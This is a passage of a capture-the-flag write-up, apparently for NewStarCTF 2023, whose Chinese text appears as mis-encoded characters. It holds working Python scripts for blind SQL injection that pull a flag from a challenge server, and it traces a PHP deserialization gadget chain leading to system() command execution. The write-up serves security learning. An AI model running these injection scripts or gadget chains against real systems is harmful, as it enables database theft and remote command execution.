å°†æ‰€æœ‰å­—æ®µåˆåœ¨ä¸€èµ·è¾“å‡ºå°±æ˜¯åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>col_count = &#123;<span class="hljs-string">&#x27;here_is_flag&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_nameå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µçš„åå­—</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆå¯¹è¡¨è¿›è¡Œéå†,åªæœ‰è¡¨F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># å½“å‰è¡¨çš„åå­—:table_name[table_index]</span><br>    <span class="hljs-comment"># col_numå­˜å‚¨å½“å‰è¡¨çš„å­—æ®µæ•°</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># å¯¹å½“å‰è¡¨çš„å­—æ®µè¿›è¡Œéå†ï¼Œè·å–å…¨éƒ¨å­—æ®µåï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_keyå­˜å‚¨å½“å‰è¡¨å½“å‰å­—æ®µçš„key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;ç¬¬&#123;&#125;å­—æ®µçš„é•¿åº¦&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_lenå­˜å‚¨å½“å‰å­—æ®µçš„é•¿åº¦</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># éå†å½“å‰å­—æ®µ</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># nameå­˜å‚¨å½“å‰å­—æ®µçš„åç§°</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>            <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>                <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((selEct(GROUP_CONCAT(COLUMN_NAME))frOm(infOrmation_schema.COLUMNS)wHere(TABLE_NAME=&#x27;here_is_flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.05</span>)<br>                <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>                true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># å­˜å‚¨å½“å‰å­—æ®µçš„åç§°:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;çš„ç¬¬&#123;&#125;ä¸ªå­—æ®µçš„åå­—&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—æ®µ</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€å¼ è¡¨</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure>

<p>è¾“å‡º:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">here_is_flagçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—:flag<br>&#123;&#x27;here_is_flagçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—&#x27;: &#x27;flag                                              &#x27;&#125;<br></code></pre></td></tr></table></figure>

<p>çˆ†å­—æ®µçš„å€¼:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;ctf&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;here_is_flag&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((seLEct(Group_cOncAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload3)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>

<p>è¾“å‡º:</p>
<p><img src="/images/2023-11-3-newstar-3/image-20231010215536171.png" srcset="/img/loading.gif" lazyload alt="image-20231010215536171"></p>
<h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>ä»£ç å®¡è®¡:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å­—ç¬¦ä¸²æ¯”è¾ƒå¯ä»¥è°ƒç”¨__toString()å‡½æ•°=&gt;$this-&gt;name=new Then()</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨ç±»è°ƒç”¨ï¼Œå¯ä»¥ç”¨äºå¯åŠ¨__invoke()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å¯ä»¥æŒ‡å®šç±»çš„å‡½æ•°end()å‡½æ•°è°ƒç”¨</span><br>        <span class="hljs-comment">//$this-&gt;obj=new CTF()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//getSträ¸ºHandleç±»çš„ä¸å­˜åœ¨å‡½æ•°æ‰€ä»¥å¯ä»¥ç”¨äºè°ƒç”¨__call</span><br>        <span class="hljs-comment">//$this-&gt;obj=new Handle()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å˜é‡åˆ é™¤å‡½æ•°å¯ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•__unset</span><br>        <span class="hljs-comment">//$this-&gt;handle-&gt;log=$WhiteGod-&gt;$func</span><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å±é™©å‡½æ•°æ³¨å…¥=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br><br></code></pre></td></tr></table></figure>

<p>popé“¾æ„é€ :</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.WhiteGod-&gt;__unset<br>2.CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>3.Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>4.Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>5.Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>6.Begin-&gt;__destruct=&gt;Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br></code></pre></td></tr></table></figure>

<p>é­”æœ¯å‡½æ•°ä»‹ç»:</p>
<p>__unsetï¼ˆï¼‰é­”æœ¯æ–¹æ³•:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">__unset()é­”æœ¯æ–¹æ³•åœ¨ä½¿ç”¨unset()å‡½æ•°åˆ é™¤ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚å½“ä¸€ä¸ªå¯¹è±¡çš„å±æ€§è¢«unsetæ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡å®šä¹‰äº†__unset()æ–¹æ³•ï¼Œé‚£ä¹ˆè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$property</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Unsetting property: &quot;</span> . <span class="hljs-variable">$property</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$obj</span>-&gt;name); <span class="hljs-comment">// è°ƒç”¨__unset()æ–¹æ³•</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªMyClassç±»ï¼Œå®ƒæœ‰ä¸€ä¸ªç§æœ‰å±æ€§<span class="hljs-variable">$name</span>ã€‚å½“ä½¿ç”¨<span class="hljs-keyword">unset</span>()å‡½æ•°åˆ é™¤<span class="hljs-variable">$obj</span>å¯¹è±¡çš„<span class="hljs-variable">$name</span>å±æ€§æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•ä¼šæ˜¾ç¤ºä¸€ä¸ªæ¶ˆæ¯<span class="hljs-string">&quot;Unsetting property: name&quot;</span>ã€‚<br><br>æ³¨æ„ï¼Œ<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•åªä¼šåœ¨è®¿é—®æƒé™å…è®¸çš„æƒ…å†µä¸‹è¢«è°ƒç”¨ã€‚å¦‚æœå±æ€§æ˜¯ç§æœ‰çš„æˆ–å—ä¿æŠ¤çš„ï¼Œåªæœ‰åœ¨ç±»çš„å†…éƒ¨æ‰èƒ½åˆ é™¤è¯¥å±æ€§ã€‚<br></code></pre></td></tr></table></figure>

<p>popé“¾æ„é€ è„šæœ¬:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 